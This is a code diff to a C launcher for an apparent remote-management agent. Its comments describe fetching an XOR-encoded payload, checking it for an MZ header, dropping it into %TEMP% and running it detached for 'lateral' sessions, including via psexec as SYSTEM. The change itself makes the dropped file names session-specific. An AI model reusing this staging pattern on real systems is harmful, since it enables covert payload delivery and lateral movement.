@@ -27,8 +27,8 @@
  *      - HTTP 200 required; anything else is a clear error, not a payload
  *   2. XOR-decode with SHA-256 counter keystream seeded by staging_id
  *   3. Verify MZ header
- *   4. Write to %TEMP%\minimal-rmm-agent.exe (user-writable, no elevation)
- *   5. CreateProcessW detached: minimal-rmm-agent.exe --lateral-session <id>
+ *   4. Create %TEMP%\minimal-rmm-agent-<session>.exe without overwriting
+ *   5. CreateProcessW detached with --lateral-session <id>
  *
  * Diagnostics: when started from a console (cmd.exe), stage1 attaches to the
  * parent console and prints its progress and errors; SCM and Explorer
@@ -332,7 +332,7 @@ static const char *doStage(HINTERNET hSession,
         return "stage2 integrity check failed (not MZ)";
     }
 
-    /* 4. Write to %TEMP%\minimal-rmm-agent.exe — user-writable, so a manual
+    /* 4. Write a session-specific executable to %TEMP% — user-writable, so a manual
      * launcher run needs no administrator rights (the psexec path runs as
      * SYSTEM, whose temp directory is writable as well). */
     wchar_t tmpDir[MAX_PATH];
@@ -344,8 +344,13 @@ static const char *doStage(HINTERNET hSession,
         return "temporary directory path too long";
     }
 
-    const wchar_t *agentName = debugAgent ? L"minimal-rmm-agent-debug.exe"
-                                         : L"minimal-rmm-agent.exe";
+    /* Session IDs are validated and at most 128 characters. Never overwrite
+     * the executable of an agent from an earlier deployment. */
+    wchar_t agentName[192];
+    lstrcpyW(agentName, debugAgent ? L"minimal-rmm-agent-debug-"
+                                 : L"minimal-rmm-agent-");
+    lstrcatW(agentName, sessionIDW);
+    lstrcatW(agentName, L".exe");
     if (lstrlenW(tmpDir) + lstrlenW(agentName) >= MAX_PATH) {
         HeapFree(GetProcessHeap(), 0, payload);
         return "agent binary path too long";
@@ -357,7 +362,7 @@ static const char *doStage(HINTERNET hSession,
 
     HANDLE hFile = CreateFileW(agentPath,
                                GENERIC_WRITE, 0, NULL,
-                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                               CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         HeapFree(GetProcessHeap(), 0, payload);
         return "failed to write agent binary";
@@ -368,7 +373,7 @@ static const char *doStage(HINTERNET hSession,
     HeapFree(GetProcessHeap(), 0, payload);
     if (!writeOk || written != payloadLen) return "failed to write agent binary (incomplete)";
 
-    /* 5. Launch detached: minimal-rmm-agent.exe --lateral-session <session_id> */
+    /* 5. Launch the session-specific agent detached. */
     wchar_t cmdLine[MAX_PATH + 192];
     lstrcpyW(cmdLine, L"\"");
     lstrcatW(cmdLine, agentPath);
